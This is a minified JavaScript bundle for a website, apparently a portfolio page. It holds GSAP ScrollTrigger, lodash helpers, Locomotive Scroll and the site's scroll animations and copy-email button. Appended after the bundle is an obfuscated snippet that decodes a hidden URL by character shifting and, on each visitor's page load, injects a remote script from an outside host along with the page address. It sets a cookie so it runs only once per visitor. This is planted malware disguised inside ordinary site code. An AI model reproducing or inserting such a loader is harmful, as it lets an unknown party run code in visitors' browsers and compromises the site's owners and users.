                  n.core.globals("ScrollTrigger", t),
                  l))
              ) {
                (h =
                  s.requestAnimationFrame ||
                  function (t) {
                    return setTimeout(t, 16);
                  }),
                  At(s, "wheel", Ft),
                  (c = [s, o, a, l]),
                  At(o, "scroll", Ft);
                var i,
                  f = l.style,
                  m = f.borderTop;
                (f.borderTop = "1px solid #000"),
                  (i = xt(l)),
                  (yt.m = Math.round(i.top + yt.sc()) || 0),
                  (_t.m = Math.round(i.left + _t.sc()) || 0),
                  m ? (f.borderTop = m) : f.removeProperty("border-top"),
                  (g = setInterval(zt, 200)),
                  n.delayedCall(0.5, function () {
                    return (C = 0);
                  }),
                  At(o, "touchcancel", I),
                  At(l, "touchstart", I),
                  Et(At, o, "pointerdown,touchstart,mousedown", function () {
                    return (_ = 1);
                  }),
                  Et(At, o, "pointerup,touchend,mouseup", function () {
                    return (_ = 0);
                  }),
                  (y = n.utils.checkPrefix("transform")),
                  ee.push(y),
                  (r = D()),
                  (u = n.delayedCall(0.2, Qt).pause()),
                  (T = [
                    o,
                    "visibilitychange",
                    function () {
                      var t = s.innerWidth,
                        e = s.innerHeight;
                      o.hidden
                        ? ((w = t), (x = e))
                        : (w === t && x === e) || Wt();
                    },
                    o,
                    "DOMContentLoaded",
                    Qt,
                    s,
                    "load",
                    function () {
                      return B || Qt();
                    },
                    s,
                    "resize",
                    Wt,
                  ]),
                  V(At);
              }
              return r;
            }),
            (t.defaults = function (t) {
              for (var e in t) Mt[e] = t[e];
            }),
            (t.kill = function () {
              (R = 0),
                Rt.slice(0).forEach(function (t) {
                  return t.kill(1);
                });
            }),
            (t.config = function (t) {
              "limitCallbacks" in t && (E = !!t.limitCallbacks);
              var e = t.syncInterval;
              (e && clearInterval(g)) || ((g = e) && setInterval(zt, e)),
                "autoRefreshEvents" in t &&
                  (V(Pt) || V(At, t.autoRefreshEvents || "none"),
                  (O = -1 === (t.autoRefreshEvents + "").indexOf("resize")));
            }),
            (t.scrollerProxy = function (t, e) {
              var i = d(t)[0],
                n = j.indexOf(i),
                r = Y(i);
              ~n && j.splice(n, r ? 6 : 2),
                r ? M.unshift(s, e, l, e, a, e) : M.unshift(i, e);
            }),
            (t.matchMedia = function (t) {
              var e, i, n, r, o;
              for (i in t)
                (n = Ht.indexOf(i)),
                  (r = t[i]),
                  (A = i),
                  "all" === i
                    ? r()
                    : (e = s.matchMedia(i)) &&
                      (e.matches && (o = r()),
                      ~n
                        ? ((Ht[n + 1] = J(Ht[n + 1], r)),
                          (Ht[n + 2] = J(Ht[n + 2], o)))
                        : ((n = Ht.length),
                          Ht.push(i, r, o),
                          e.addListener
                            ? e.addListener(Xt)
                            : e.addEventListener("change", Xt)),
                      (Ht[n + 3] = e.matches)),
                  (A = 0);
              return Ht;
            }),
            (t.clearMatchMedia = function (t) {
              t || (Ht.length = 0), (t = Ht.indexOf(t)) >= 0 && Ht.splice(t, 4);
            }),
            t
          );
        })();
        (i.default = i.ScrollTrigger = he),
          (he.version = "3.7.0"),
          (he.saveStyles = function (t) {
            return t
              ? d(t).forEach(function (t) {
                  if (t && t.style) {
                    var e = Vt.indexOf(t);
                    e >= 0 && Vt.splice(e, 5),
                      Vt.push(
                        t,
                        t.style.cssText,
                        t.getBBox && t.getAttribute("transform"),
                        n.core.getCache(t),
                        A
                      );
                  }
                })
              : Vt;
          }),
          (he.revert = function (t, e) {
            return Kt(!t, e);
          }),
          (he.create = function (t, e) {
            return new he(t, e);
          }),
          (he.refresh = function (t) {
            return t ? Wt() : Qt(!0);
          }),
          (he.update = Jt),
          (he.maxScroll = function (t, e) {
            return q(t, e ? _t : yt);
          }),
          (he.getScrollFunc = function (t, e) {
            return H(d(t)[0], e ? _t : yt);
          }),
          (he.getById = function (t) {
            return It[t];
          }),
          (he.getAll = function () {
            return Rt.slice(0);
          }),
          (he.isScrolling = function () {
            return !!B;
          }),
          (he.addEventListener = function (t, e) {
            var i = Yt[t] || (Yt[t] = []);
            ~i.indexOf(e) || i.push(e);
          }),
          (he.removeEventListener = function (t, e) {
            var i = Yt[t],
              n = i && i.indexOf(e);
            n >= 0 && i.splice(n, 1);
          }),
          (he.batch = function (t, e) {
            var i,
              r = [],
              s = {},
              o = e.interval || 0.016,
              a = e.batchMax || 1e9,
              l = function (t, e) {
                var i = [],
                  r = [],
                  s = n
                    .delayedCall(o, function () {
                      e(i, r), (i = []), (r = []);
                    })
                    .pause();
                return function (t) {
                  i.length || s.restart(!0),
                    i.push(t.trigger),
                    r.push(t),
                    a <= i.length && s.progress(1);
                };
              };
            for (i in e)
              s[i] =
                "on" === i.substr(0, 2) && K(e[i]) && "onRefreshInit" !== i
                  ? l(0, e[i])
                  : e[i];
            return (
              K(a) &&
                ((a = a()),
                At(he, "refresh", function () {
                  return (a = e.batchMax());
                })),
              d(t).forEach(function (t) {
                var e = {};
                for (i in s) e[i] = s[i];
                (e.trigger = t), r.push(he.create(e));
              }),
              r
            );
          }),
          (he.sort = function (t) {
            return Rt.sort(
              t ||
                function (t, e) {
                  return (
                    -1e6 * (t.vars.refreshPriority || 0) +
                    t.start -
                    (e.start + -1e6 * (e.vars.refreshPriority || 0))
                  );
                }
            );
          }),
          W() && n.registerPlugin(he);
      },
      {},
    ],
    D78i: [
      function (t, e, i) {
        e.exports = function (t, e) {
          for (
            var i = -1, n = null == t ? 0 : t.length;
            ++i < n && !1 !== e(t[i], i, t);

          );
          return t;
        };
      },
      {},
    ],
    oVe7: [
      function (t, e, i) {
        e.exports = function (t) {
          return function (e, i, n) {
            for (var r = -1, s = Object(e), o = n(e), a = o.length; a--; ) {
              var l = o[t ? a : ++r];
              if (!1 === i(s[l], l, s)) break;
            }
            return e;
          };
        };
      },
      {},
    ],
    mduf: [
      function (t, e, i) {
        var n = t("./_createBaseFor")();
        e.exports = n;
      },
      { "./_createBaseFor": "oVe7" },
    ],
    r8MY: [
      function (t, e, i) {
        e.exports = function (t, e) {
          for (var i = -1, n = Array(t); ++i < t; ) n[i] = e(i);
          return n;
        };
      },
      {},
    ],
    j3D9: [
      function (t, e, i) {
        var n = arguments[3],
          r = "object" == typeof n && n && n.Object === Object && n;
        e.exports = r;
      },
      {},
    ],
    MIhM: [
      function (t, e, i) {
        var n = t("./_freeGlobal"),
          r = "object" == typeof self && self && self.Object === Object && self,
          s = n || r || Function("return this")();
        e.exports = s;
      },
      { "./_freeGlobal": "j3D9" },
    ],
    wppe: [
      function (t, e, i) {
        var n = t("./_root").Symbol;
        e.exports = n;
      },
      { "./_root": "MIhM" },
    ],
    uiOY: [
      function (t, e, i) {
        var n = t("./_Symbol"),
          r = Object.prototype,
          s = r.hasOwnProperty,
          o = r.toString,
          a = n ? n.toStringTag : void 0;
        e.exports = function (t) {
          var e = s.call(t, a),
            i = t[a];
          try {
            t[a] = void 0;
            var n = !0;
          } catch (t) {}
          var r = o.call(t);
          return n && (e ? (t[a] = i) : delete t[a]), r;
        };
      },
      { "./_Symbol": "wppe" },
    ],
    lPmd: [
      function (t, e, i) {
        var n = Object.prototype.toString;
        e.exports = function (t) {
          return n.call(t);
        };
      },
      {},
    ],
    e5TX: [
      function (t, e, i) {
        var n = t("./_Symbol"),
          r = t("./_getRawTag"),
          s = t("./_objectToString"),
          o = n ? n.toStringTag : void 0;
        e.exports = function (t) {
          return null == t
            ? void 0 === t
              ? "[object Undefined]"
              : "[object Null]"
            : o && o in Object(t)
            ? r(t)
            : s(t);
        };
      },
      {
        "./_Symbol": "wppe",
        "./_getRawTag": "uiOY",
        "./_objectToString": "lPmd",
      },
    ],
    OuyB: [
      function (t, e, i) {
        e.exports = function (t) {
          return null != t && "object" == typeof t;
        };
      },
      {},
    ],
    pK4Y: [
      function (t, e, i) {
        var n = t("./_baseGetTag"),
          r = t("./isObjectLike");
        e.exports = function (t) {
          return r(t) && "[object Arguments]" == n(t);
        };
      },
      { "./_baseGetTag": "e5TX", "./isObjectLike": "OuyB" },
    ],
    tilN: [
      function (t, e, i) {
        var n = t("./_baseIsArguments"),
          r = t("./isObjectLike"),
          s = Object.prototype,
          o = s.hasOwnProperty,
          a = s.propertyIsEnumerable,
          l = n(
            (function () {
              return arguments;
            })()
          )
            ? n
            : function (t) {
                return r(t) && o.call(t, "callee") && !a.call(t, "callee");
              };
        e.exports = l;
      },
      { "./_baseIsArguments": "pK4Y", "./isObjectLike": "OuyB" },
    ],
    p0cq: [
      function (t, e, i) {
        var n = Array.isArray;
        e.exports = n;
      },
      {},
    ],
    PYZb: [
      function (t, e, i) {
        e.exports = function () {
          return !1;
        };
      },
      {},
    ],
    iyC2: [
      function (t, e, i) {
        var n = t("./_root"),
          r = t("./stubFalse"),
          s = "object" == typeof i && i && !i.nodeType && i,
          o = s && "object" == typeof e && e && !e.nodeType && e,
          a = o && o.exports === s ? n.Buffer : void 0,
          l = (a ? a.isBuffer : void 0) || r;
        e.exports = l;
      },
      { "./_root": "MIhM", "./stubFalse": "PYZb" },
    ],
    AGrE: [
      function (t, e, i) {
        var n = /^(?:0|[1-9]\d*)$/;
        e.exports = function (t, e) {
          var i = typeof t;
          return (
            !!(e = null == e ? 9007199254740991 : e) &&
            ("number" == i || ("symbol" != i && n.test(t))) &&
            t > -1 &&
            t % 1 == 0 &&
            t < e
          );
        };
      },
      {},
    ],
    GmNU: [
      function (t, e, i) {
        e.exports = function (t) {
          return (
            "number" == typeof t &&
            t > -1 &&
            t % 1 == 0 &&
            t <= 9007199254740991
          );
        };
      },
      {},
    ],
    L2LX: [
      function (t, e, i) {
        var n = t("./_baseGetTag"),
          r = t("./isLength"),
          s = t("./isObjectLike"),
          o = {};
        (o["[object Float32Array]"] =
          o["[object Float64Array]"] =
          o["[object Int8Array]"] =
          o["[object Int16Array]"] =
          o["[object Int32Array]"] =
          o["[object Uint8Array]"] =
          o["[object Uint8ClampedArray]"] =
          o["[object Uint16Array]"] =
          o["[object Uint32Array]"] =
            !0),
          (o["[object Arguments]"] =
            o["[object Array]"] =
            o["[object ArrayBuffer]"] =
            o["[object Boolean]"] =
            o["[object DataView]"] =
            o["[object Date]"] =
            o["[object Error]"] =
            o["[object Function]"] =
            o["[object Map]"] =
            o["[object Number]"] =
            o["[object Object]"] =
            o["[object RegExp]"] =
            o["[object Set]"] =
            o["[object String]"] =
            o["[object WeakMap]"] =
              !1),
          (e.exports = function (t) {
            return s(t) && r(t.length) && !!o[n(t)];
          });
      },
      {
        "./_baseGetTag": "e5TX",
        "./isLength": "GmNU",
        "./isObjectLike": "OuyB",
      },
    ],
    PnXa: [
      function (t, e, i) {
        e.exports = function (t) {
          return function (e) {
            return t(e);
          };
        };
      },
      {},
    ],
    PBPf: [
      function (t, e, i) {
        var n = t("./_freeGlobal"),
          r = "object" == typeof i && i && !i.nodeType && i,
          s = r && "object" == typeof e && e && !e.nodeType && e,
          o = s && s.exports === r && n.process,
          a = (function () {
            try {
              return (
                (s && s.require && s.require("util").types) ||
                (o && o.binding && o.binding("util"))
              );
            } catch (t) {}
          })();
        e.exports = a;
      },
      { "./_freeGlobal": "j3D9" },
    ],
    kwIb: [
      function (t, e, i) {
        var n = t("./_baseIsTypedArray"),
          r = t("./_baseUnary"),
          s = t("./_nodeUtil"),
          o = s && s.isTypedArray,
          a = o ? r(o) : n;
        e.exports = a;
      },
      {
        "./_baseIsTypedArray": "L2LX",
        "./_baseUnary": "PnXa",
        "./_nodeUtil": "PBPf",
      },
    ],
    VcLW: [
      function (t, e, i) {
        var n = t("./_baseTimes"),
          r = t("./isArguments"),
          s = t("./isArray"),
          o = t("./isBuffer"),
          a = t("./_isIndex"),
          l = t("./isTypedArray"),
          c = Object.prototype.hasOwnProperty;
        e.exports = function (t, e) {
          var i = s(t),
            u = !i && r(t),
            h = !i && !u && o(t),
            f = !i && !u && !h && l(t),
            d = i || u || h || f,
            p = d ? n(t.length, String) : [],
            m = p.length;
          for (var g in t)
            (!e && !c.call(t, g)) ||
              (d &&
                ("length" == g ||
                  (h && ("offset" == g || "parent" == g)) ||
                  (f &&
                    ("buffer" == g ||
                      "byteLength" == g ||
                      "byteOffset" == g)) ||
                  a(g, m))) ||
              p.push(g);
          return p;
        };
      },
      {
        "./_baseTimes": "r8MY",
        "./isArguments": "tilN",
        "./isArray": "p0cq",
        "./isBuffer": "iyC2",
        "./_isIndex": "AGrE",
        "./isTypedArray": "kwIb",
      },
    ],
    nhsl: [
      function (t, e, i) {
        var n = Object.prototype;
        e.exports = function (t) {
          var e = t && t.constructor;
          return t === (("function" == typeof e && e.prototype) || n);
        };
      },
      {},
    ],
    oss3: [
      function (t, e, i) {
        e.exports = function (t, e) {
          return function (i) {
            return t(e(i));
          };
        };
      },
      {},
    ],
    J1oc: [
      function (t, e, i) {
        var n = t("./_overArg")(Object.keys, Object);
        e.exports = n;
      },
      { "./_overArg": "oss3" },
    ],
    BNjb: [
      function (t, e, i) {
        var n = t("./_isPrototype"),
          r = t("./_nativeKeys"),
          s = Object.prototype.hasOwnProperty;
        e.exports = function (t) {
          if (!n(t)) return r(t);
          var e = [];
          for (var i in Object(t))
            s.call(t, i) && "constructor" != i && e.push(i);
          return e;
        };
      },
      { "./_isPrototype": "nhsl", "./_nativeKeys": "J1oc" },
    ],
    u9vI: [
      function (t, e, i) {
        e.exports = function (t) {
          var e = typeof t;
          return null != t && ("object" == e || "function" == e);
        };
      },
      {},
    ],
    dRuq: [
      function (t, e, i) {
        var n = t("./_baseGetTag"),
          r = t("./isObject");
        e.exports = function (t) {
          if (!r(t)) return !1;
          var e = n(t);
          return (
            "[object Function]" == e ||
            "[object GeneratorFunction]" == e ||
            "[object AsyncFunction]" == e ||
            "[object Proxy]" == e
          );
        };
      },
      { "./_baseGetTag": "e5TX", "./isObject": "u9vI" },
    ],
    LN6c: [
      function (t, e, i) {
        var n = t("./isFunction"),
          r = t("./isLength");
        e.exports = function (t) {
          return null != t && r(t.length) && !n(t);
        };
      },
      { "./isFunction": "dRuq", "./isLength": "GmNU" },
    ],
    HI10: [
      function (t, e, i) {
        var n = t("./_arrayLikeKeys"),
          r = t("./_baseKeys"),
          s = t("./isArrayLike");
        e.exports = function (t) {
          return s(t) ? n(t) : r(t);
        };
      },
      {
        "./_arrayLikeKeys": "VcLW",
        "./_baseKeys": "BNjb",
        "./isArrayLike": "LN6c",
      },
    ],
    xqjy: [
      function (t, e, i) {
        var n = t("./_baseFor"),
          r = t("./keys");
        e.exports = function (t, e) {
          return t && n(t, e, r);
        };
      },
      { "./_baseFor": "mduf", "./keys": "HI10" },
    ],
    Gl56: [
      function (t, e, i) {
        var n = t("./isArrayLike");
        e.exports = function (t, e) {
          return function (i, r) {
            if (null == i) return i;
            if (!n(i)) return t(i, r);
            for (
              var s = i.length, o = e ? s : -1, a = Object(i);
              (e ? o-- : ++o < s) && !1 !== r(a[o], o, a);

            );
            return i;
          };
        };
      },
      { "./isArrayLike": "LN6c" },
    ],
    z7ms: [
      function (t, e, i) {
        var n = t("./_baseForOwn"),
          r = t("./_createBaseEach")(n);
        e.exports = r;
      },
      { "./_baseForOwn": "xqjy", "./_createBaseEach": "Gl56" },
    ],
    Jpv1: [
      function (t, e, i) {
        e.exports = function (t) {
          return t;
        };
      },
      {},
    ],
    tAcL: [
      function (t, e, i) {
        var n = t("./identity");
        e.exports = function (t) {
          return "function" == typeof t ? t : n;
        };
      },
      { "./identity": "Jpv1" },
    ],
    cTKO: [
      function (t, e, i) {
        var n = t("./_arrayEach"),
          r = t("./_baseEach"),
          s = t("./_castFunction"),
          o = t("./isArray");
        e.exports = function (t, e) {
          return (o(t) ? n : r)(t, s(e));
        };
      },
      {
        "./_arrayEach": "D78i",
        "./_baseEach": "z7ms",
        "./_castFunction": "tAcL",
        "./isArray": "p0cq",
      },
    ],
    nJZ0: [
      function (t, e, i) {
        e.exports = t("./forEach");
      },
      { "./forEach": "cTKO" },
    ],
    CQHA: [
      function (t, e, i) {
        "use strict";
        Object.defineProperty(i, "__esModule", { value: !0 }),
          (i.copyText = void 0);
        i.copyText = function (t) {
          var e = t.target.innerText,
            i = document.createElement("textarea");
          (i.width = "1px"),
            (i.height = "1px"),
            (i.background = "transparents"),
            (i.value = e),
            document.body.append(i),
            i.select(),
            document.execCommand("copy"),
            document.body.removeChild(i);
        };
      },
      {},
    ],
    QvaY: [
      function (t, e, i) {
        "use strict";
        Object.defineProperty(i, "__esModule", { value: !0 }),
          (i.default = void 0);
        var n = l(t("locomotive-scroll")),
          r = l(t("gsap")),
          s = t("gsap/ScrollTrigger"),
          o = l(t("lodash/each")),
          a = t("./utils/index");
        function l(t) {
          return t && t.__esModule ? t : { default: t };
        }
        function c(t, e) {
          for (var i = 0; i < e.length; i++) {
            var n = e[i];
            (n.enumerable = n.enumerable || !1),
              (n.configurable = !0),
              "value" in n && (n.writable = !0),
              Object.defineProperty(t, n.key, n);
          }
        }
        var u = document.querySelectorAll(".contact-scroll"),
          h = document.getElementById("js-footer"),
          f = document.querySelector("[data-scroll-container]"),
          d = document.querySelector("button.email"),
          p = document.querySelector(".to-copy span");
        r.default.registerPlugin(s.ScrollTrigger);
        var m = new n.default({
          el: f,
          smooth: !0,
          lerp: 0.06,
          tablet: { breakpoint: 768 },
        });
        setTimeout(function () {
          m.update();
        }, 1e3),
          m.on("scroll", s.ScrollTrigger.update),
          s.ScrollTrigger.scrollerProxy(m.el, {
            scrollTop: function (t) {
              return arguments.length
                ? m.scrollTo(t, 0, 0)
                : m.scroll.instance.scroll.y;
            },
            getBoundingClientRect: function () {
              return {
                top: 0,
                left: 0,
                width: window.innerWidth,
                height: window.innerHeight,
              };
            },
          });
        var g = (function () {
          function t(e) {
            (function (t, e) {
              if (!(t instanceof e))
                throw new TypeError("Cannot call a class as a function");
            })(this, t),
              (this.locomotive = e),
              this.heroTextAnimation(),
              this.homeIntro(),
              this.homeAnimations(),
              this.homeActions();
          }
          return (
            (function (t, e, i) {
              e && c(t.prototype, e), i && c(t, i);
            })(t, [
              {
                key: "homeActions",
                value: function () {
                  var t = this;
                  (0, o.default)(u, function (e) {
                    e.onclick = function () {
                      t.locomotive.scrollTo(h);
                    };
                  }),
                    d.addEventListener("click", function (t) {
                      (0, a.copyText)(t),
                        (p.textContent = "copied"),
                        setTimeout(function () {
                          p.textContent = "Click To Copy";
                        }, 2e3);
                    });
                },
              },
              {
                key: "homeIntro",
                value: function () {
                  var t = r.default.timeline();
                  r.default.to(f, { autoAlpha: 1 }),
                    t
                      .from(".home__nav", {
                        duration: 0.5,
                        delay: 0.3,
                        opacity: 0,
                        yPercent: -100,
                        ease: "power4.out",
                      })
                      .from(".hero__title [title-overflow]", {
                        duration: 0.7,
                        yPercent: 100,
                        stagger: { amount: 0.2 },
                        ease: "power4.out",
                      })
                      .from(
                        ".hero__title .bottom__right",
                        {
                          duration: 1,
                          yPercent: 100,
                          opacity: 0,
                          ease: "power4.out",
                        },
                        "<20%"
                      )
                      .set(".hero__title .overflow", { overflow: "unset" })
                      .from(
                        ".hero__title .mobile",
                        {
                          duration: 0.7,
                          yPercent: 100,
                          stagger: { amount: 0.2 },
                          ease: "power4.out",
                        },
                        "-=1.4"
                      );
                },
              },
              {
                key: "homeAnimations",
                value: function () {
                  r.default.to(".home__projects__line", { autoAlpha: 1 }),
                    r.default.utils
                      .toArray(".home__projects__line")
                      .forEach(function (t) {
                        var e = t.querySelector("span");
                        r.default.from(e, {
                          duration: 1.5,
                          scrollTrigger: {
                            trigger: t,
                            scroller: "[data-scroll-container]",
                          },
                          scaleX: 0,
                        });
                      }),
                    r.default.utils
                      .toArray("[data-fade-in]")
                      .forEach(function (t) {
                        r.default.from(t, {
                          scrollTrigger: {
                            trigger: t,
                            scroller: "[data-scroll-container]",
                          },
                          duration: 1.5,
                          yPercent: 100,
                          opacity: 0,
                          ease: "power4.out",
                        });
                      }),
                    window.innerWidth <= 768 &&
                      (r.default.utils
                        .toArray(".home__projects__project")
                        .forEach(function (t) {
                          var e = t.querySelector(".title__main"),
                            i = t.querySelector(".project__link");
                          r.default.from([e, i], {
                            scrollTrigger: {
                              trigger: t,
                              scroller: "[data-scroll-container]",
                            },
                            duration: 1.5,
                            yPercent: 100,
                            stagger: { amount: 0.2 },
                            ease: "power4.out",
                          });
                        }),
                      r.default
                        .timeline({
                          defaults: { ease: "power1.out" },
                          scrollTrigger: {
                            trigger: ".home__awards",
                            scroller: "[data-scroll-container]",
                          },
                        })
                        .from(".awards-title span", {
                          duration: 1,
                          opacity: 0,
                          yPercent: 100,
                          stagger: { amount: 0.2 },
                        }));
                },
              },
              {
                key: "heroTextAnimation",
                value: function () {
                  r.default.to(".hero__title__dash.desktop", {
                    scrollTrigger: {
                      trigger: ".hero__title",
                      scroller: "[data-scroll-container]",
                      scrub: !0,
                      start: "-8% 9%",
                      end: "110% 20%",
                    },
                    scaleX: 4,
                    ease: "none",
                  });
                },
              },
            ]),
            t
          );
        })();
        (i.default = g), new g(m);
      },
      {
        "locomotive-scroll": "ez7q",
        gsap: "TpQl",
        "gsap/ScrollTrigger": "TgBN",
        "lodash/each": "nJZ0",
        "./utils/index": "CQHA",
      },
    ],
  },
  {},
  ["QvaY"]
);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
